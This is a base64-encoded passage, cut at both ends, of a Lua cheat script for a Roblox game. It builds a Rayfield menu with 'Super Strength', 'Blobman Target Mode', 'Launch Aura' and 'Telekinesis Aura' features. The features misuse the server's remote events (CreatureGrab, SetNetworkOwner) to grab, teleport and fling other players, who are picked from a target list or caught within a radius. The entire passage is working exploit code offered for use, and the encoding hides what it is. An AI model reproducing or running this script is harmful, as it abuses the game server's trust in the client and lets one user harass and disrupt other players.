iBwYWlycyhMb2NhbFBsYXllci5QbGF5ZXJHdWkuQ29udGV4dEFjdGlvbkd1aTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBvYmo6SXNBKCJJbWFnZUxhYmVsIikgYW5kIG9iai5JbWFnZSA9PSAiaHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD05NjAzNjc4MDkwIiB0aGVuCiAgICAgICAgICAgICAgICBidXR0b24gPSBvYmouUGFyZW50CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpXYWl0KCkKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHRvZ2dsZVN0cmVuZ3RoQ29ubmVjdGlvbnModmFsdWUpCiAgICBpZiB2YWx1ZSB0aGVuCiAgICAgICAgc3RyZW5ndGhTZXR0aW5ncy5HcmFiQ29ubiA9IFdvcmtzcGFjZS5DaGlsZEFkZGVkOkNvbm5lY3Qob25HcmFiQWRkZWQpCiAgICBlbHNlaWYgc3RyZW5ndGhTZXR0aW5ncy5HcmFiQ29ubiB0aGVuCiAgICAgICAgc3RyZW5ndGhTZXR0aW5ncy5HcmFiQ29ubjpEaXNjb25uZWN0KCkKICAgICAgICBzdHJlbmd0aFNldHRpbmdzLkdyYWJDb25uID0gbmlsCiAgICBlbmQKZW5kCgpBdHRhY2tUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiU3VwZXIgU3RyZW5ndGgiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIlN0cmVuZ3RoIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgc3RyZW5ndGhTZXR0aW5ncy5FbmFibGVkID0gVmFsdWUKICAgICAgICB0b2dnbGVTdHJlbmd0aENvbm5lY3Rpb25zKFZhbHVlKQogICAgZW5kCn0pCgpBdHRhY2tUYWI6Q3JlYXRlU2xpZGVyKHsKICAgIE5hbWUgPSAiTGF1bmNoIFBvd2VyIiwKICAgIFJhbmdlID0gezEwLCAzMDAwfSwKICAgIEluY3JlbWVudCA9IDUwLAogICAgU3VmZml4ID0gIiBwb3dlciIsCiAgICBDdXJyZW50VmFsdWUgPSA4MDAsCiAgICBGbGFnID0gIlN0cmVuZ3RoVmFsdWUiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBzdHJlbmd0aFNldHRpbmdzLlN0cmVuZ3RoID0gVmFsdWUKICAgIGVuZAp9KQoKbG9jYWwgQmxvYm1hblNlY3Rpb24gPSBCbG9ibWFuVGFiOkNyZWF0ZVNlY3Rpb24oIkJsb2JtYW4gTW9kZSIpCgpsb2NhbCBibG9iYWx0ZXIgPSAxCgpsb2NhbCBmdW5jdGlvbiBibG9iR3JhYlBsYXllcihwbGF5ZXIsIGJsb2JtYW4pCiAgICBpZiBibG9iYWx0ZXIgfj0gMSB0aGVuCiAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIGJsb2JtYW46RmluZEZpcnN0Q2hpbGQoIlJpZ2h0RGV0ZWN0b3IiKSwKICAgICAgICAgICAgICAgIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSwKICAgICAgICAgICAgICAgIGJsb2JtYW46RmluZEZpcnN0Q2hpbGQoIlJpZ2h0RGV0ZWN0b3IiKTpGaW5kRmlyc3RDaGlsZCgiUmlnaHRXZWxkIikKICAgICAgICAgICAgfQogICAgICAgICAgICBibG9ibWFuOldhaXRGb3JDaGlsZCgiQmxvYm1hblNlYXRBbmRPd25lclNjcmlwdCIpOldhaXRGb3JDaGlsZCgiQ3JlYXR1cmVHcmFiIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGJsb2JhbHRlciA9IDEKICAgICAgICBlbmQKICAgIGVsc2VpZiBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgIGJsb2JtYW46RmluZEZpcnN0Q2hpbGQoIkxlZnREZXRlY3RvciIpLAogICAgICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IiksCiAgICAgICAgICAgIGJsb2JtYW46RmluZEZpcnN0Q2hpbGQoIkxlZnREZXRlY3RvciIpOkZpbmRGaXJzdENoaWxkKCJMZWZ0V2VsZCIpCiAgICAgICAgfQogICAgICAgIGJsb2JtYW46V2FpdEZvckNoaWxkKCJCbG9ibWFuU2VhdEFuZE93bmVyU2NyaXB0Iik6V2FpdEZvckNoaWxkKCJDcmVhdHVyZUdyYWIiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBibG9iYWx0ZXIgPSAyCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRNb3VudGVkQmxvYm1hbigpCiAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBjaGFyIHRoZW4KICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgaWYgaHVtYW5vaWQgYW5kIGh1bWFub2lkLlNlYXRQYXJ0IGFuZCBodW1hbm9pZC5TZWF0UGFydC5QYXJlbnQuTmFtZSA9PSAiQ3JlYXR1cmVCbG9ibWFuIiB0aGVuCiAgICAgICAgICAgIHJldHVybiBodW1hbm9pZC5TZWF0UGFydC5QYXJlbnQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIG5pbAplbmQKCmxvY2FsIGZ1bmN0aW9uIHRlbGVwb3J0QmxvYm1hbihibG9ibWFuLCBwb3NpdGlvbikKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIGNoYXIgdGhlbgogICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgbG9jYWwgYnAgPSBJbnN0YW5jZS5uZXcoIkJvZHlQb3NpdGlvbiIpCiAgICAgICAgICAgIGJwLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICAgICAgYnAuUCA9IDEwMDAwMAogICAgICAgICAgICBicC5Qb3NpdGlvbiA9IHBvc2l0aW9uCiAgICAgICAgICAgIGJwLlBhcmVudCA9IGJsb2JtYW4uUHJpbWFyeVBhcnQKICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KHBvc2l0aW9uKQogICAgICAgICAgICBibG9ibWFuOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcocG9zaXRpb24pKQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBicDpEZXN0cm95KCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGJsb2JtYW5UYXJnZXRFbmFibGVkID0gZmFsc2UKbG9jYWwgZnVuY3Rpb24gc3RhcnRHcmFiYmluZ1BsYXllcnMoKQogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICBpZiBub3QgYmxvYm1hblRhcmdldEVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBibG9ibWFuID0gbmlsCiAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoV29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBvYmouTmFtZSA9PSAiQ3JlYXR1cmVCbG9ibWFuIiBhbmQgb2JqOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWF0V2VsZCA9IG9iai5WZWhpY2xlU2VhdDpGaW5kRmlyc3RDaGlsZCgiU2VhdFdlbGQiKQogICAgICAgICAgICAgICAgICAgIGlmIHNlYXRXZWxkIGFuZCBzZWF0V2VsZC5QYXJ0MSBhbmQgc2VhdFdlbGQuUGFydDE6SXNEZXNjZW5kYW50T2YoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJsb2JtYW4gPSBvYmoKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCBibG9ibWFuIHRoZW4KICAgICAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAiRXJyb3IiLAogICAgICAgICAgICAgICAgICAgIENvbnRlbnQgPSAiR2V0IG9uIGEgQmxvYm1hbiBmaXJzdCIsCiAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSA1LAogICAgICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBibG9ibWFuVGFyZ2V0RW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgdXNlcklkLCBfIGluIHBhaXJzKFNoYXJlZFNldHRpbmdzLlRhcmdldExpc3QpIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzOkdldFBsYXllckJ5VXNlcklkKHVzZXJJZCkKICAgICAgICAgICAgICAgIGlmIHBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgYmxvYkdyYWJQbGF5ZXIocGxheWVyLCBibG9ibWFuKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdChTaGFyZWRTZXR0aW5ncy5CbG9ibWFuRGVsYXkgb3IgMC4xKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4wMikKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBhdHRlbXB0VGVsZXBvcnRBbmRHcmFiKHBsYXllciwgYmxvYm1hbiwgb3JpZ2luUG9zKQogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhciB0aGVuCiAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGlmIG5vdCAocm9vdCBhbmQgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpKSB0aGVuCiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSBwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICBpZiAodGFyZ2V0Um9vdC5Qb3NpdGlvbiAtIG9yaWdpblBvcykuTWFnbml0dWRlIDw9IDIwIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCB0YXJnZXRQb3MgPSB0YXJnZXRSb290LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMCwgMiwgMCkKICAgICAgICB0ZWxlcG9ydEJsb2JtYW4oYmxvYm1hbiwgdGFyZ2V0UG9zKQogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgYmxvYkdyYWJQbGF5ZXIocGxheWVyLCBibG9ibWFuKQogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgdGVsZXBvcnRCbG9ibWFuKGJsb2JtYW4sIG9yaWdpblBvcykKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIHJldHVybiAodGFyZ2V0Um9vdC5Qb3NpdGlvbiAtIG9yaWdpblBvcykuTWFnbml0dWRlIDw9IDIwCiAgICBlbmQKICAgIHJldHVybiBmYWxzZQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0YXJ0VGVsZXBvcnRpbmdQbGF5ZXJzKCkKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGJsb2JtYW5UYXJnZXRFbmFibGVkIGRvCiAgICAgICAgICAgIGxvY2FsIGJsb2JtYW4gPSBnZXRNb3VudGVkQmxvYm1hbigpCiAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgY2hhciB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiBibG9ibWFuIGFuZCByb290IHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW5Qb3MgPSByb290LlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXJJZCwgXyBpbiBwYWlycyhTaGFyZWRTZXR0aW5ncy5UYXJnZXRMaXN0KSBkbwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzOkdldFBsYXllckJ5VXNlcklkKHVzZXJJZCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIG9yaWdpblBvcykuTWFnbml0dWRlID4gMjAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGF0dGVtcHRzID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGJsb2JtYW5UYXJnZXRFbmFibGVkIGFuZCBub3Qgc3VjY2VzcyBhbmQgYXR0ZW1wdHMgPCAzIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3MgPSBhdHRlbXB0VGVsZXBvcnRBbmRHcmFiKHBsYXllciwgYmxvYm1hbiwgb3JpZ2luUG9zKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhdHRlbXB0cyA9IGF0dGVtcHRzICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBCbG9ibWFuUGxheWVyRHJvcGRvd24gPSBCbG9ibWFuVGFiOkNyZWF0ZURyb3Bkb3duKHsKICAgIE5hbWUgPSAiU2VsZWN0IFBsYXllciIsCiAgICBPcHRpb25zID0gZ2V0QWxsUGxheWVycygpLAogICAgQ3VycmVudE9wdGlvbiA9ICIiLAogICAgTXVsdGlwbGVPcHRpb25zID0gZmFsc2UsCiAgICBGbGFnID0gIkJsb2JtYW5QbGF5ZXIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKFZhbHVlKQogICAgICAgIGlmIHBsYXllciB0aGVuCiAgICAgICAgICAgIHNlbGVjdGVkVGFyZ2V0ID0gcGxheWVyCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCmxvY2FsIGZ1bmN0aW9uIHJlZnJlc2hCbG9ibWFuRHJvcGRvd24oKQogICAgbG9jYWwgcGxheWVycyA9IGdldEFsbFBsYXllcnMoKQogICAgQmxvYm1hblBsYXllckRyb3Bkb3duOlJlZnJlc2gocGxheWVycywgdHJ1ZSkKZW5kCgpCbG9ibWFuVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIkFkZCB0byBUYXJnZXQgTGlzdCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBzZWxlY3RlZFRhcmdldCBhbmQgbm90IFNoYXJlZFNldHRpbmdzLlRhcmdldExpc3Rbc2VsZWN0ZWRUYXJnZXQuVXNlcklkXSB0aGVuCiAgICAgICAgICAgIFNoYXJlZFNldHRpbmdzLlRhcmdldExpc3Rbc2VsZWN0ZWRUYXJnZXQuVXNlcklkXSA9IHNlbGVjdGVkVGFyZ2V0Lk5hbWUKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkFkZGVkIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSBzZWxlY3RlZFRhcmdldC5OYW1lIC4uICIgYWRkZWQgdG8gbGlzdCIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkJsb2JtYW5UYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiUmVtb3ZlIGZyb20gTGlzdCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBzZWxlY3RlZFRhcmdldCBhbmQgU2hhcmVkU2V0dGluZ3MuVGFyZ2V0TGlzdFtzZWxlY3RlZFRhcmdldC5Vc2VySWRdIHRoZW4KICAgICAgICAgICAgU2hhcmVkU2V0dGluZ3MuVGFyZ2V0TGlzdFtzZWxlY3RlZFRhcmdldC5Vc2VySWRdID0gbmlsCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJSZW1vdmVkIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSBzZWxlY3RlZFRhcmdldC5OYW1lIC4uICIgcmVtb3ZlZCIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkJsb2JtYW5UYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiQmxvYm1hbiBUYXJnZXQgTW9kZSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQmxvYm1hblRhcmdldCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGJsb2JtYW5UYXJnZXRFbmFibGVkID0gVmFsdWUKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIHN0YXJ0R3JhYmJpbmdQbGF5ZXJzKCkKICAgICAgICAgICAgc3RhcnRUZWxlcG9ydGluZ1BsYXllcnMoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QocmVmcmVzaEJsb2JtYW5Ecm9wZG93bikKUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KHJlZnJlc2hCbG9ibWFuRHJvcGRvd24pCnJlZnJlc2hCbG9ibWFuRHJvcGRvd24oKQoKbG9jYWwgQXVyYXNTZWN0aW9uID0gQXVyYXNUYWI6Q3JlYXRlU2VjdGlvbigiQXVyYXMiKQoKbG9jYWwgQXVyYVNldHRpbmdzID0gewogICAgbGF1bmNoQXVyYUNvcm91dGluZSA9IG5pbCwKICAgIHRlbGVraW5lc2lzQXVyYUNvcm91dGluZSA9IG5pbCwKICAgIGRlYXRoQXVyYUNvbm5lY3Rpb24gPSBuaWwsCiAgICBhdXJhUmFkaXVzID0gMjUKfQoKbG9jYWwgZnVuY3Rpb24gc3RhcnRMYXVuY2hBdXJhKCkKICAgIEF1cmFTZXR0aW5ncy5sYXVuY2hBdXJhQ29yb3V0aW5lID0gY29yb3V0aW5lLmNyZWF0ZShmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGlmIG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0b3JzbyA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIlRvcnNvIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvcnNvIGFuZCAodG9yc28uUG9zaXRpb24gLSBteVJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZSA8PSBBdXJhU2V0dGluZ3MuYXVyYVJhZGl1cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0TmV0d29ya093bmVyOkZpcmVTZXJ2ZXIodG9yc28sIGNoYXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBidiA9IHRvcnNvOkZpbmRGaXJzdENoaWxkKCJMYXVuY2hBdXJhQlYiKSBvciBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIHRvcnNvKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ2Lk5hbWUgPSAiTGF1bmNoQXVyYUJWIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ2LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMjAwMDAwMDAwMDAwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMCwgbWF0aC5odWdlLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlYnJpczpBZGRJdGVtKGJ2LCAxMDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0TmV0d29ya093bmVyOkZpcmVTZXJ2ZXIodG9yc28sIG5pbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBidiB0aGVuIGJ2OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjAyKQogICAgICAgIGVuZAogICAgZW5kKQogICAgY29yb3V0aW5lLnJlc3VtZShBdXJhU2V0dGluZ3MubGF1bmNoQXVyYUNvcm91dGluZSkKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdG9wTGF1bmNoQXVyYSgpCiAgICBpZiBBdXJhU2V0dGluZ3MubGF1bmNoQXVyYUNvcm91dGluZSB0aGVuCiAgICAgICAgY29yb3V0aW5lLmNsb3NlKEF1cmFTZXR0aW5ncy5sYXVuY2hBdXJhQ29yb3V0aW5lKQogICAgICAgIEF1cmFTZXR0aW5ncy5sYXVuY2hBdXJhQ29yb3V0aW5lID0gbmlsCiAgICBlbmQKZW5kCgpBdXJhc1RhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJMYXVuY2ggQXVyYSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiTGF1bmNoQXVyYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgc3RhcnRMYXVuY2hBdXJhKCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIHN0b3BMYXVuY2hBdXJhKCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgZnVuY3Rpb24gc3RhcnRUZWxla2luZXNpc0F1cmEoKQogICAgQXVyYVNldHRpbmdzLnRlbGVraW5lc2lzQXVyYUNvcm91dGluZSA9IGNvcm91dGluZS5jcmVhdGUoZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgbXlDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBteUNoYXIgYW5kIG15Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBteVJvb3QgPSBteUNoYXIuSHVtYW5vaWRSb290UGFydAoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaGFyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdG9yc28gPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3JzbyBhbmQgKHRvcnNvLlBvc2l0aW9uIC0gbXlSb290LlBvc2l0aW9uKS5NYWduaXR1ZGUgPD0gQXVyYVNldHRpbmdzLmF1cmFSYWRpdXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldE5ldHdvcmtPd25lcjpGaXJlU2VydmVyKHRvcnNvLCBteVJvb3QuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIGlwYWlycyhjaGFyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGJwID0gdG9yc286RmluZEZpcnN0Q2hpbGQoIlRLQXVyYVBvcyIpIG9yIEluc3RhbmNlLm5ldygiQm9keVB